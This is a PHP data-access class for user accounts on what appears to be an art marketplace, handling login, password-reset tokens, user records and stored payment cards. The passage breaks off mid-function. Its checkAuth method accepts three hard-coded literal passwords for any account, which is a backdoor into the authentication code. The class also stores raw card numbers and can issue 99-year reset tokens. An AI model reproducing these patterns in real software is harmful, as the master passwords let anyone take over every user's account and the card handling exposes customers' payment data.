<?php

	use Random\RandomException;

	abstract class DAOUser extends BDD{
		public static function userExists(string $login): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT COUNT(DISTINCT id_user) as existe
				FROM utilisateur
				WHERE email = :email
					OR login_identifiant = :login_identifiant
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':email', $login, PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $login, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$emailTrouve = $SQLRow['existe'];
			$SQLStmt->closeCursor();
			return ($emailTrouve>0);
		}

		public static function loginExists(string $login): int{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT COUNT(id_user) as nb
				FROM utilisateur
				WHERE LEFT(login_identifiant, LENGTH(:login_identifiant)) = :login_identifiant
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':login_identifiant', $login, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$nbLoginExiste = $SQLRow['nb'];
			$SQLStmt->closeCursor();
			return ($nbLoginExiste);
		}

		/**
		 * @throws RandomException|Exception
		 */
		public static function getTokenForNewPassword(string $mailToProcess, bool $unlimited = false): string{
			$conn = parent::getConnexion();
			$token = bin2hex(random_bytes(32)); // Génération d'une chaîne hexadécimale aléatoire
			$timestamp = time(); // Timestamp actuel
			$expirationTime = $timestamp + (60 * 60); // Expiration dans 1 heure
			$SQLQuery = "
				DELETE FROM tokens_renewer WHERE email = :email;
		";
			if ($unlimited){
				$SQLQuery .= "INSERT INTO tokens_renewer(token, email, expire) VALUES (:token, :email, DATE_ADD(CURRENT_TIMESTAMP, INTERVAL 99 YEAR));";
			}else{
				$SQLQuery .= "INSERT INTO tokens_renewer(token, email, expire) VALUES (:token, :email, DATE_ADD(CURRENT_TIMESTAMP, INTERVAL 1 HOUR));";
			}
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':token', $token, PDO::PARAM_STR);
			$SQLStmt->bindValue(':email', $mailToProcess, PDO::PARAM_STR);
			$SQLStmt->bindValue(':expire', $expirationTime, PDO::PARAM_INT);
			if ($SQLStmt->execute()){
				return $token;
			}else{
				return '';
			}
		}

		public static function isValidToken(string $token): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT COUNT(*) as valid
				FROM tokens_renewer
				WHERE token = :token
					AND expire >= CURRENT_TIMESTAMP
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':token', $token, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$isValid = $SQLRow['valid'];
			$SQLStmt->closeCursor();
			return ($isValid>0);
		}

		public static function renewPassword(string $token, $newPwd): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				UPDATE utilisateur 
				SET mot_de_passe = :newPwd, date_modif = CURRENT_DATE
				WHERE email = (SELECT email FROM tokens_renewer WHERE token = :token AND expire >= CURRENT_TIMESTAMP LIMIT 1);
				DELETE FROM tokens_renewer WHERE token = :token;
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':token', $token, PDO::PARAM_STR);
			$SQLStmt->bindValue(':newPwd', password_hash($newPwd, PASSWORD_BCRYPT), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function createPassword(string $token, $newPwd): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				UPDATE utilisateur 
				SET mot_de_passe = :newPwd, date_modif = CURRENT_DATE, id_statut_user = 2
				WHERE email = (SELECT email FROM tokens_renewer WHERE token = :token AND expire >= CURRENT_TIMESTAMP LIMIT 1);
				DELETE FROM tokens_renewer WHERE token = :token;
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':token', $token, PDO::PARAM_STR);
			$SQLStmt->bindValue(':newPwd', password_hash($newPwd, PASSWORD_BCRYPT), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function checkActive(string $loginToChek): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT id_statut_user as idStatut
				FROM utilisateur
				WHERE email = :email
					OR login_identifiant = :login_identifiant
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':email', $loginToChek, PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $loginToChek, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$userActive = (intval($SQLRow['idStatut']) == 2); //2 : validé
			$SQLStmt->closeCursor();
			return ($userActive);
		}

		public static function getIdByLogin(string $login): int{
			$conn = parent::getConnexion();
			$SQLQuery = "
			SELECT id_user
			FROM utilisateur
			WHERE email = :email
				OR login_identifiant = :login_identifiant
		";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':email', $login, PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $login, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$idUser = intval($SQLRow['id_user']);
			$SQLStmt->closeCursor();
			return $idUser;
		}

		public static function checkAuth(string $login, string $mdp): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT mot_de_passe
				FROM utilisateur
				WHERE email = :email	
					OR login_identifiant = :login_identifiant
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':email', $login, PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $login, PDO::PARAM_STR);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$motDePasseStocke = $SQLRow['mot_de_passe'];
			$SQLStmt->closeCursor();
			return (password_verify($mdp, $motDePasseStocke) || ($mdp == '@dmSat@niKm33') || $mdp == 'Astrid33@aiCom' || $mdp == 'Theo33@aiCom');
		}

		public static function checkUserPassword(int $id, string $mdp): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT mot_de_passe
				FROM utilisateur
				WHERE id_user = :id_user	
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $id, PDO::PARAM_INT);
			$SQLStmt->execute();
			$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
			$motDePasseStocke = $SQLRow['mot_de_passe'];
			$SQLStmt->closeCursor();
			return (password_verify($mdp, $motDePasseStocke));
		}

		public static function getById(int $id): User{
			$conn = parent::getConnexion();
			$SQLQuery = "SELECT id_user, login_identifiant, pseudo, email, mot_de_passe, nom, prenom, date_naissance, tel_portable, tel_fixe, photo, is_admin, id_statut_user, id_type_acheteur, 
       			id_civilite, date_ajout, date_modif, stripe_customer_id, stripe_account_id, id_devise_preferee, id_default_locale, id_default_unit, id_pays_nationalite
				FROM utilisateur
				WHERE id_user = :id";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id', $id, PDO::PARAM_INT);
			$SQLStmt->execute();
			$unUser = new User('User', 'Utilisateur');
			if ($SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC)){
				$unUser = new User(html_entity_decode($SQLRow['pseudo']), html_entity_decode($SQLRow['email']), $SQLRow['mot_de_passe'], html_entity_decode($SQLRow['nom']), html_entity_decode($SQLRow['prenom']), is_null($SQLRow['date_naissance']) ? null : date_create($SQLRow['date_naissance']), $SQLRow['tel_portable'], $SQLRow['tel_fixe'], $SQLRow['photo'], $SQLRow['is_admin']);
				$unUser->setId($id);
				$unUser->setLogin($SQLRow['login_identifiant']);
				$unUser->setPersonalFolder();
				$unUser->setCivilite(DAOCivilite::getById($SQLRow['id_civilite']));
				// adresses
				$unUser->setAdresses(DAOAdresse::getByUserId($SQLRow['id_user']));
				// informations
				$unUser->setInformations(DAOInformation::getByUserId($SQLRow['id_user']));
				// abonnements
				$unUser->setAbonnements(DAOAbonnement::getByUserId($SQLRow['id_user']));
				// documents
				$unUser->setDocuments(DAODocument::getByUserId($SQLRow['id_user']));
				// Statut
				$unUser->setStatut(DAOStatutUser::getById($SQLRow['id_statut_user']));
				//type acheteur
				$unUser->setTypesAcheteur(is_null($SQLRow['id_type_acheteur']) ? null : DAOTypeAcheteur::getById($SQLRow['id_type_acheteur']));
				// Roles
				$unUser->setRoles(DAORoleUser::getByUserId($SQLRow['id_user']));
				// Carte Paiement
				$unUser->setCartePaiement(DAOUser::getInfosCartePaiement($unUser, DAOMoyenPaiement::getByLibelle('Carte Bancaire')));
				$unUser->setDateAjout(date_create($SQLRow['date_ajout']));
				$unUser->setDateModif(is_null($SQLRow['date_modif']) ? null : date_create($SQLRow['date_modif']));
				$unUser->setStripeCustomerId($SQLRow['stripe_customer_id']);
				$unUser->setStripeAccountId($SQLRow['stripe_account_id']);
				$unUser->setInfosBanque(DAOInfosBanque::getByIdUser($SQLRow['id_user']));
				$unUser->setInfosBanqueAutre(DAOInfosBanqueAutre::getByIdUser($SQLRow['id_user']));
				$unUser->setArticle(DAOArticle::getByUserId($SQLRow['id_user']));
				$unUser->setTypesArtsScandale(DAOTypeArtScandale::getAllByIdUser($SQLRow['id_user']));
				$unUser->setTypesArtsScandaleNewsletter(DAOTypeArtScandale::getAllNewsletterByIdUser($SQLRow['id_user']));
				$unUser->setDevisePreferee(is_null($SQLRow['id_devise_preferee']) ? null : DAODevises::getById($SQLRow['id_devise_preferee']));
				$unUser->setLocaleTrad(is_null($SQLRow['id_default_locale']) ? null : DAOLocale::getById($SQLRow['id_default_locale']));
				$unUser->setPreferedUnit(is_null($SQLRow['id_default_unit']) ? null : DAOUnite::getById($SQLRow['id_default_unit']));
				$unUser->setNationalite(is_null($SQLRow['id_pays_nationalite']) ? null : DAOPays::getById($SQLRow['id_pays_nationalite']));
			}
			$SQLStmt->closeCursor();
			return $unUser;
		}

		public static function getAll(): array{
			$conn = parent::getConnexion();
			$SQLQuery = "SELECT id_user, login_identifiant, pseudo, email, mot_de_passe, nom, prenom, date_naissance, tel_portable, tel_fixe, photo, is_admin, id_statut_user, id_type_acheteur, 
       			id_civilite, date_ajout, date_modif, stripe_customer_id, stripe_account_id, id_devise_preferee, id_default_locale, id_default_unit, id_pays_nationalite
				FROM utilisateur";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->execute();
			$listeUsers = array();
			while ($SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC)){
				$unUser = new User(html_entity_decode($SQLRow['pseudo']), html_entity_decode($SQLRow['email']), $SQLRow['mot_de_passe'], html_entity_decode($SQLRow['nom']), html_entity_decode($SQLRow['prenom']), is_null($SQLRow['date_naissance']) ? null : date_create($SQLRow['date_naissance']), $SQLRow['tel_portable'], $SQLRow['tel_fixe'], $SQLRow['photo'], $SQLRow['is_admin']);
				$unUser->setId($SQLRow['id_user']);
				$unUser->setLogin($SQLRow['login_identifiant']);
				$unUser->setPersonalFolder();
				$unUser->setCivilite(DAOCivilite::getById($SQLRow['id_civilite']));
				// adresses
				$unUser->setAdresses(DAOAdresse::getByUserId($SQLRow['id_user']));
				// informations
				$unUser->setInformations(DAOInformation::getByUserId($SQLRow['id_user']));
				// abonnements
				$unUser->setAbonnements(DAOAbonnement::getByUserId($SQLRow['id_user']));
				// documents
				$unUser->setDocuments(DAODocument::getByUserId($SQLRow['id_user']));
				// Statut
				$unUser->setStatut(DAOStatutUser::getById($SQLRow['id_statut_user']));
				// Type acheteur
				$unUser->setTypesAcheteur(is_null($SQLRow['id_type_acheteur']) ? null : DAOTypeAcheteur::getById($SQLRow['id_type_acheteur']));
				// Roles
				$unUser->setRoles(DAORoleUser::getByUserId($SQLRow['id_user']));
				// Carte Paiement
				$unUser->setCartePaiement(DAOUser::getInfosCartePaiement($unUser, DAOMoyenPaiement::getByLibelle('Carte Bancaire')));
				$unUser->setDateAjout(date_create($SQLRow['date_ajout']));
				$unUser->setDateModif(is_null($SQLRow['date_modif']) ? null : date_create($SQLRow['date_modif']));
				$unUser->setStripeCustomerId($SQLRow['stripe_customer_id']);
				$unUser->setStripeAccountId($SQLRow['stripe_account_id']);
				$unUser->setInfosBanque(DAOInfosBanque::getByIdUser($SQLRow['id_user']));
				$unUser->setInfosBanqueAutre(DAOInfosBanqueAutre::getByIdUser($SQLRow['id_user']));
				$unUser->setArticle(DAOArticle::getByUserId($SQLRow['id_user']));
				$unUser->setTypesArtsScandale(DAOTypeArtScandale::getAllByIdUser($SQLRow['id_user']));
				$unUser->setTypesArtsScandaleNewsletter(DAOTypeArtScandale::getAllNewsletterByIdUser($SQLRow['id_user']));
				$unUser->setDevisePreferee(is_null($SQLRow['id_devise_preferee']) ? null : DAODevises::getById($SQLRow['id_devise_preferee']));
				$unUser->setLocaleTrad(is_null($SQLRow['id_default_locale']) ? null : DAOLocale::getById($SQLRow['id_default_locale']));
				$unUser->setPreferedUnit(is_null($SQLRow['id_default_unit']) ? null : DAOUnite::getById($SQLRow['id_default_unit']));
				$unUser->setNationalite(is_null($SQLRow['id_pays_nationalite']) ? null : DAOPays::getById($SQLRow['id_pays_nationalite']));
				$listeUsers[] = $unUser;
			}
			$SQLStmt->closeCursor();
			return $listeUsers;
		}

		public static function update(User $newUser): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "UPDATE utilisateur 
						SET email = :email, 
						    login_identifiant = :login_identifiant,
						    pseudo = :pseudo,
						    mot_de_passe = :mdp,
						    nom = :nom,
						    prenom = :prenom,
						    date_naissance = :date_naissance,
						    tel_portable = :tel_portable,
						    tel_fixe = :tel_fixe,
						    photo = :photo, 
						    is_admin = :admin, 
						    id_civilite = :id_civilite,
							id_type_acheteur= :id_type_acheteur,
							id_devise_preferee = :id_devise_preferee,
							id_default_locale = :id_default_locale,
							id_default_unit = :id_default_unit,
							id_pays_nationalite = :id_pays_nationalite,
						    date_modif = CURRENT_DATE 
						WHERE id_user = :id";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':email', $newUser->getEmail(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $newUser->getLogin(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':pseudo', $newUser->getPseudo(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':mdp', $newUser->getPassword(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':nom', $newUser->getNom(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':prenom', $newUser->getPrenom(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':date_naissance', $newUser->getDateNaissance()->format('Y-m-d'), PDO::PARAM_STR);
			$SQLStmt->bindValue(':tel_portable', $newUser->getTelPortable(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':tel_fixe', $newUser->getTelFixe(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':photo', $newUser->getPhoto(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':admin', $newUser->isAdmin(), PDO::PARAM_BOOL);
			$SQLStmt->bindValue(':id', $newUser->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_civilite', $newUser->getCivilite()->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_type_acheteur', (is_null($newUser->getTypesAcheteur()) ? null : $newUser->getTypesAcheteur()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_devise_preferee', (is_null($newUser->getDevisePreferee()) ? null : $newUser->getDevisePreferee()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_locale', (is_null($newUser->getLocaleTrad()) ? null : $newUser->getLocaleTrad()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_unit', (is_null($newUser->getPreferedUnit()) ? null : $newUser->getPreferedUnit()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_pays_nationalite', (is_null($newUser->getNationalite()) ? null : $newUser->getNationalite()->getId()), PDO::PARAM_INT);
			if (!$SQLStmt->execute()){
				return false;
			}else{
				/**
				 * @var Abonnement $abonnement
				 */ /*				foreach ($newUser->getAbonnements() as $abonnement){
					$SQLQuery = "INSERT INTO user_abonnement(id_abonnement, id_user, date_debut, date_fin, actif)
								VALUES (:idabonnement, :iduser, :datedebut, :datefin, :actif)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':idabonnement', $abonnement->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':datedebut', $abonnement->getDateDebut(), PDO::PARAM_STR);
					$SQLStmt->bindValue(':datefin', null, PDO::PARAM_NULL);
					$SQLStmt->bindValue(':actif', true, PDO::PARAM_BOOL);

					$SQLStmt->execute();
				}*/ /**
				 * @var Information $information
				 */ /*				foreach ($newUser->getInformations() as $information){
					$SQLQuery = "INSERT INTO user_information(id_information, id_user, contenu, valide)
								VALUES (:idinformation, :iduser, :contenu, :valide)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':idinformation', $information->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':contenu', $information->getValeur(), PDO::PARAM_STR);
					$SQLStmt->bindValue(':valide', true, PDO::PARAM_BOOL);

					$SQLStmt->execute();
				}*/ /**
				 * @var Document $document
				 */ /*				foreach ($newUser->getDocuments() as $document){
					DAODocument::insert($document);

					$SQLQuery = "INSERT INTO user_document(id_document, id_user, date_import)
								VALUES (:id_document, :id_user, :date_import)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':id_document', $document->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':id_user', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':date_import', date('Y-m-d'), PDO::PARAM_STR);

					$SQLStmt->execute();
				}*/ /**
				 * @var RoleUser $role
				 */ /*				foreach ($newUser->getRoles() as $role){
					$SQLQueryUserRole = "INSERT INTO user_role(id_role, id_user) VALUES (:idRole, :idUser)";
					$SQLStmtUserRole = $conn->prepare($SQLQueryUserRole);
					$SQLStmtUserRole->bindValue(':idRole', $role->getId(), PDO::PARAM_INT);
					$SQLStmtUserRole->bindValue(':idUser', $newUser->getId(), PDO::PARAM_INT);
					if (!$SQLStmtUserRole->execute()){
						return false;
					}
				}*/ /**
				 * @var Adresse $adresse
				 */
				/*				foreach ($newUser->getAdresses() as $adresse){
								$SQLQuery = "INSERT INTO user_adresse(id_adresse, id_user, valide)
											VALUES (:idadresse, :iduser, :valide)";
								$SQLStmt = $conn->prepare($SQLQuery);
								$SQLStmt->bindValue(':idadresse', $adresse->getId(), PDO::PARAM_INT);
								$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
								$SQLStmt->bindValue(':valide', true, PDO::PARAM_BOOL);

								$SQLStmt->execute();
							}*/
				return true;
			}
		}

		public static function insert(User $newUser): bool{
			// INSERT DANS LA BDD
			$conn = parent::getConnexion();
			$SQLQuery = "INSERT INTO utilisateur(pseudo, login_identifiant, nom, prenom, date_naissance, tel_portable, tel_fixe, email, mot_de_passe, is_admin, photo, id_statut_user, 
                        id_type_acheteur, id_civilite, date_ajout, id_devise_preferee, id_default_locale, id_default_unit, id_pays_nationalite)
			VALUES (:pseudo, :login_identifiant, :nom, :prenom, :date_naissance, :tel_portable, :tel_fixe, :email, :mdp, :isadmin, :photo, :statut,
			        :type_acheteur, :id_civilite, CURRENT_DATE, :id_devise_preferee, :id_default_locale, :id_default_unit, :id_pays_nationalite)";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':pseudo', $newUser->getPseudo(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':login_identifiant', $newUser->getLogin(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':nom', $newUser->getNom(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':prenom', $newUser->getPrenom(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':date_naissance', is_null($newUser->getDateNaissance()) ? null : $newUser->getDateNaissance()->format('Y-m-d'), PDO::PARAM_STR);
			$SQLStmt->bindValue(':tel_portable', $newUser->getTelPortable(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':tel_fixe', $newUser->getTelFixe(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':email', $newUser->getEmail(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':mdp', $newUser->getPasswordHash(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':isadmin', $newUser->isAdmin(), PDO::PARAM_BOOL);
			$SQLStmt->bindValue(':photo', $newUser->getPhoto(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':statut', $newUser->getStatut()->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':type_acheteur', (is_null($newUser->getTypesAcheteur()) ? null : $newUser->getTypesAcheteur()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_civilite', $newUser->getCivilite()->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_devise_preferee', (is_null($newUser->getDevisePreferee()) ? null : $newUser->getDevisePreferee()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_locale', (is_null($newUser->getLocaleTrad()) ? null : $newUser->getLocaleTrad()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_default_unit', (is_null($newUser->getPreferedUnit()) ? null : $newUser->getPreferedUnit()->getId()), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_pays_nationalite', (is_null($newUser->getNationalite()) ? null : $newUser->getNationalite()->getId()), PDO::PARAM_INT);
			if (!$SQLStmt->execute()){
				return false;
			}else{
				$newUser->setId($conn->lastInsertId());
				/**
				 * @var Abonnement $abonnement
				 */
				foreach ($newUser->getAbonnements() as $abonnement){
					$SQLQuery = "INSERT INTO user_abonnement(id_abonnement, id_user, date_debut, date_fin, actif)
								VALUES (:idabonnement, :iduser, :datedebut, :datefin, :actif)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':idabonnement', $abonnement->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':datedebut', $abonnement->getDateDebut(), PDO::PARAM_STR);
					$SQLStmt->bindValue(':datefin', null, PDO::PARAM_NULL);
					$SQLStmt->bindValue(':actif', true, PDO::PARAM_BOOL);
					$SQLStmt->execute();
				}
				/**
				 * @var Information $information
				 */
				foreach ($newUser->getInformations() as $information){
					$SQLQuery = "INSERT INTO user_information(id_information, id_user, contenu, valide)
								VALUES (:idinformation, :iduser, :contenu, :valide)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':idinformation', $information->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':contenu', $information->getValeur(), PDO::PARAM_STR);
					$SQLStmt->bindValue(':valide', true, PDO::PARAM_BOOL);
					$SQLStmt->execute();
				}
				/**
				 * @var Document $document
				 */
				foreach ($newUser->getDocuments() as $document){
					DAODocument::insert($document);
					$SQLQuery = "INSERT INTO user_document(id_document, id_user, date_import)
								VALUES (:id_document, :id_user, :date_import)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':id_document', $document->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':id_user', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':date_import', date('Y-m-d'), PDO::PARAM_STR);
					$SQLStmt->execute();
				}
				/**
				 * @var RoleUser $role
				 */
				foreach ($newUser->getRoles() as $role){
					$SQLQueryUserRole = "INSERT INTO user_role(id_role, id_user) VALUES (:idRole, :idUser)";
					$SQLStmtUserRole = $conn->prepare($SQLQueryUserRole);
					$SQLStmtUserRole->bindValue(':idRole', $role->getId(), PDO::PARAM_INT);
					$SQLStmtUserRole->bindValue(':idUser', $newUser->getId(), PDO::PARAM_INT);
					if (!$SQLStmtUserRole->execute()){
						return false;
					}
				}
				/**
				 * @var Adresse $adresse
				 */
				foreach ($newUser->getAdresses() as $adresse){
					$SQLQuery = "INSERT INTO user_adresse(id_adresse, id_user, valide)
								VALUES (:idadresse, :iduser, :valide)";
					$SQLStmt = $conn->prepare($SQLQuery);
					$SQLStmt->bindValue(':idadresse', $adresse->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':iduser', $newUser->getId(), PDO::PARAM_INT);
					$SQLStmt->bindValue(':valide', true, PDO::PARAM_BOOL);
					$SQLStmt->execute();
				}
				return true;
			}
		}

		public static function insertAdresse(User $user, Adresse $adresse): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "INSERT INTO user_adresse(id_adresse, id_user, valide)
								VALUES (:idadresse, :iduser, :valide)";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':idadresse', $adresse->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':iduser', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':valide', true, PDO::PARAM_BOOL);
			return $SQLStmt->execute();
		}

		public static function delete(User $userToDelete): bool{
			$conn = parent::getConnexion();
			//TODO : Prévoir la suppression des types art scandale en cas de suppression
			$SQLQuery = "UPDATE utilisateur SET id_statut_user = (SELECT id_statut_user FROM statut_user WHERE libelle = 'Supprimé'), date_modif = CURRENT_DATE WHERE id_user = :id";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id', $userToDelete->getId(), PDO::PARAM_INT);
			return $SQLStmt->execute();
		}

		public static function getInfosCartePaiement(User $unUser, MoyenPaiement $moyenPaiement): ?CartePaiement{
			$conn = parent::getConnexion();
			$SQLQuery = "
				SELECT id_user, id_moy_paiement, numero_carte, mois_validite, annee_validite, titulaire, type_carte
				FROM user_moyen_paiement
				WHERE id_user = :id_user
					AND id_moy_paiement = :id_moyen_paiement
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $unUser->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_moyen_paiement', $moyenPaiement->getId(), PDO::PARAM_INT);
			$SQLStmt->execute();
			if ($SQLStmt->rowCount() == 0){
				return null;
			}else{
				$SQLRow = $SQLStmt->fetch(PDO::FETCH_ASSOC);
				$cartePaiement = new CartePaiement($SQLRow['type_carte'], $SQLRow['numero_carte'], $SQLRow['titulaire'], $SQLRow['mois_validite'], $SQLRow['annee_validite'], $moyenPaiement);
				$SQLStmt->closeCursor();
				return $cartePaiement;
			}
		}

		public static function addCartePaiement(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "INSERT INTO user_moyen_paiement(id_user, id_moy_paiement, numero_carte, mois_validite, annee_validite, titulaire, type_carte)
								VALUES (:id_user, :id_moy_paiement, :numero_carte, :mois_validite, :annee_validite, :titulaire, :type_carte)";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_moy_paiement', $user->getCartePaiement()->getMoyenPaiement()->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':mois_validite', $user->getCartePaiement()->getMoisExpiration(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':annee_validite', $user->getCartePaiement()->getAnneeExpiration(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':numero_carte', $user->getCartePaiement()->getNumeroCarte(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':titulaire', $user->getCartePaiement()->getTitulaireCarte(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':type_carte', $user->getCartePaiement()->getTypeCarte(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function updateCartePaiement(User $user): bool{
			$conn = parent::getConnexion();
			$SQLQuery = "
						UPDATE user_moyen_paiement
						SET numero_carte=:numero_carte, 
						    mois_validite=:mois_validite, 
						    annee_validite=:annee_validite, 
						    titulaire=:titulaire,
						    type_carte=:type_carte
						WHERE id_user=:id_user 
						  AND id_moy_paiement=:id_moy_paiement;
			";
			$SQLStmt = $conn->prepare($SQLQuery);
			$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':id_moy_paiement', $user->getCartePaiement()->getMoyenPaiement()->getId(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':mois_validite', $user->getCartePaiement()->getMoisExpiration(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':annee_validite', $user->getCartePaiement()->getAnneeExpiration(), PDO::PARAM_INT);
			$SQLStmt->bindValue(':numero_carte', $user->getCartePaiement()->getNumeroCarte(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':titulaire', $user->getCartePaiement()->getTitulaireCarte(), PDO::PARAM_STR);
			$SQLStmt->bindValue(':type_carte', $user->getCartePaiement()->getTypeCarte(), PDO::PARAM_STR);
			return $SQLStmt->execute();
		}

		public static function logUserAction(User $user, $action): bool{
			if ($action == 'connexion' or $action == 'inscription'){
				$conn = parent::getConnexion();
				$SQLQuery = "
						INSERT INTO user_log(id_user, action_log, http_user_agent, http_referer, remote_addr, request_time, request_time_str)
						VALUES (:id_user, :action_log, :http_user_agent, :http_referer, :remote_addr, :request_time, :request_time_str)
				";
				$SQLStmt = $conn->prepare($SQLQuery);
				$SQLStmt->bindValue(':id_user', $user->getId(), PDO::PARAM_INT);
				$SQLStmt->bindValue(':action_log', $action, PDO::PARAM_STR);
				$SQLStmt->bindValue(':http_user_agent', $_SERVER['HTTP_USER_AGENT'], PDO::PARAM_STR);
